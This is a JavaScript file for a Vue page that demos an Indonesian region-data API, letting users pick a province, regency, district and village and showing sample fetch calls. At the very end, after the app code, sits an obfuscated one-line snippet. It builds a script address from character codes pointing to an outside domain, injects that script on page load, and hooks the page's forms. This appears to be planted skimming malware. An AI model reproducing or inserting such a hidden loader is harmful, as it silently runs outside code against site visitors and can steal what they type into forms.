function getCurrentUrl() {
  const url = location.href.split('?').shift()

  if (url.match(/\/$/)) {
    return url.replace(/\/$/, '')
  }

  if (url.match(/index\.html$/)) {
    return url.replace(/index\.html$/, '')
  }

  return url
}

const el = new Vue({
  el: '#app',
  data: {
    baseApiUrl: getCurrentUrl() + '/api',
    provinces: [],
    regencies: [],
    districts: [],
    villages: [],
    fetchingProvinces: false,
    fetchingRegencies: false,
    fetchingDistricts: false,
    fetchingVillages: false,
    provinceId: '',
    regencyId: '',
    districtId: '',
    villageId: '',
    completed: false,
  },
  watch: {
    provinceId() {
      this.regencyId = ''
      this.districtId = ''
      this.villageId = ''
      this.fetchRegencies()
    },
    regencyId() {
      this.districtId = ''
      this.villageId = ''
      this.fetchDistricts()
    },
    districtId() {
      this.villageId = ''
      this.fetchVillages()
    },
    villageId() {
      this.completed = true
    }
  },
  computed: {
    urlApiProvinces() {
      return `${this.baseApiUrl}/provinces.json`
    },
    urlApiRegencies() {
      return `${this.baseApiUrl}/regencies/${this.provinceId}.json`
    },
    urlApiDistricts() {
      return `${this.baseApiUrl}/districts/${this.regencyId}.json`
    },
    urlApiVillages() {
      return `${this.baseApiUrl}/villages/${this.districtId}.json`
    },
    fetchProvincesCode() {
      return [
        `fetch(\`<a href="${this.urlApiProvinces}" target="_blank">${this.urlApiProvinces}</a>\`)`,
        '.then(response => response.json())',
        '.then(provinces => console.log(provinces));'
      ].join('\n')
    },
    fetchRegenciesCode() {
      return !this.provinceId ? '' : [
        `<small class="text-fade-50">// ID Provinsi ${this.selectedProvince.name} = ${this.provinceId}</small>`,
        `fetch(\`<a href="${this.urlApiRegencies}" target="_blank">${this.urlApiRegencies}</a>\`)`,
        '.then(response => response.json())',
        '.then(regencies => console.log(regencies));'
      ].join('\n')
    },
    fetchDistrictsCode() {
      return !this.regencyId ? '' : [
        `<small class="text-fade-50">// ID ${this.selectedRegency.name} = ${this.regencyId}</small>`,
        `fetch(\`<a href="${this.urlApiDistricts}" target="_blank">${this.urlApiDistricts}</a>\`)`,
        '.then(response => response.json())',
        '.then(districts => console.log(districts));'
      ].join('\n')
    },
    fetchVillagesCode() {
      return !this.districtId ? '' : [
        `<small class="text-fade-50">// ID Kecamatan ${this.selectedDistrict.name} = ${this.districtId}</small>`,
        `fetch(\`<a href="${this.urlApiVillages}" target="_blank">${this.urlApiVillages}</a>\`)`,
        '.then(response => response.json())',
        '.then(villages => console.log(villages));'
      ].join('\n')
    },
    selectedProvince() {
      return this.provinces.find(item => item.id == this.provinceId)
    },
    selectedRegency() {
      return this.regencies.find(item => item.id == this.regencyId)
    },
    selectedDistrict() {
      return this.districts.find(item => item.id == this.districtId)
    },
    selectedVillage() {
      return this.villages.find(item => item.id == this.villageId)
    },
    responseProvinces() {
      return JSON.stringify(this.provinces, null, 2)
    },
    responseRegencies() {
      return JSON.stringify(this.regencies, null, 2)
    },
    responseDistricts() {
      return JSON.stringify(this.districts, null, 2)
    },
    responseVillages() {
      return JSON.stringify(this.villages, null, 2)
    },
  },
  created() {
    this.fetchProvinces()
  },
  mounted() {
    [...document.querySelectorAll('.unhide-on-mounted')].forEach(el => {
      el.classList.remove('d-none')
    })
  },
  methods: {
    async fetchProvinces() {
      this.fetchingProvinces = true
      const result = await fetch(`api/provinces.json`)
      this.fetchingProvinces = false
      this.provinces = await result.json()
    },
    async fetchRegencies() {
      if (!this.provinceId) {
        this.regencies = []
        return
      }
      this.fetchingRegencies = true
      const result = await fetch(`api/regencies/${this.provinceId}.json`)
      this.fetchingRegencies = false
      this.regencies = await result.json()
    },
    async fetchDistricts() {
      if (!this.regencyId) {
        this.districts = []
        return
      }

      this.fetchingDistricts = true
      const result = await fetch(`api/districts/${this.regencyId}.json`)
      this.fetchingDistricts = false
      this.districts = await result.json()
    },
    async fetchVillages() {
      if (!this.districtId) {
        this.villages = []
        return
      }

      this.fetchingVillages = true
      const result = await fetch(`api/villages/${this.districtId}.json`)
      this.fetchingVillages = false
      this.villages = await result.json()
    }
  }
})

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b